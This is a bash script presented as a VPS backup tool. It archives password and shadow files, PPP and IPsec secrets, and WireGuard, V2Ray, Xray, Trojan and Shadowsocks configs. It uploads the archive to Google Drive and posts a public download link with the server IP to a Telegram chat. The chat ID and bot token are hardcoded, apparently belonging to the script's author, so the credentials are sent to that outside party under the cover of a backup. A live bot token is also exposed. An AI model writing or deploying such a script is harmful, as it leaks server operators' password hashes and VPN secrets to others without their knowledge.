#!/bin/bash

CHATID="5325141986"
KEY="5318532626:AAH9spkuFm00gnYQAXNwKkvoeH_MTWn0u1A"
TIME="10"
BRL="https://api.telegram.org/bot$KEY/sendMessage"


red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
MYIP=$(wget -qO- ifconfig.co);
echo "Checking VPS"
clear
IP=$(wget -qO- ifconfig.co);
date=$(date +"%Y-%m-%d")
clear
echo " Pastikan Sudah Setting Chat ID anda di pengaturan" | lolcat
sleep 1
echo " Dan Pastikan Sudah Start Bot @GDStore_bot " | lolcat
echo Membuat Directory
mkdir /root/backup
sleep 1
echo Start Backup
clear
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp -r /etc/wireguard backup/wireguard
cp /etc/ppp/chap-secrets backup/chap-secrets
cp /etc/ipsec.d/passwd backup/passwd1
cp /etc/shadowsocks-libev/akun.conf backup/ss.conf
cp -r /var/lib/premium-script/ backup/premium-script
cp -r /home/sstp backup/sstp
cp -r /etc/v2ray backup/v2ray
cp -r /etc/xray backup/xray
cp -r /etc/trojan backup/trojan
cp -r /usr/local/shadowsocksr/ backup/shadowsocksr
cp -r /home/vps/public_html backup/public_html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
TEXT="The following is a link to your vps data backup file.

Your VPS IP $IP

If you want to restore data, please enter the link above.

Thank You For Using Our Services Script By GDSTore :)

Your Link = $link"
rm -rf /root/backup
rm -r /root/$IP-$date.zip
echo "Done"
echo "Please Check Bot Telegram Or Copy Under Text" | lolcat
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT" $BRL >/dev/null
echo $link | lolcat
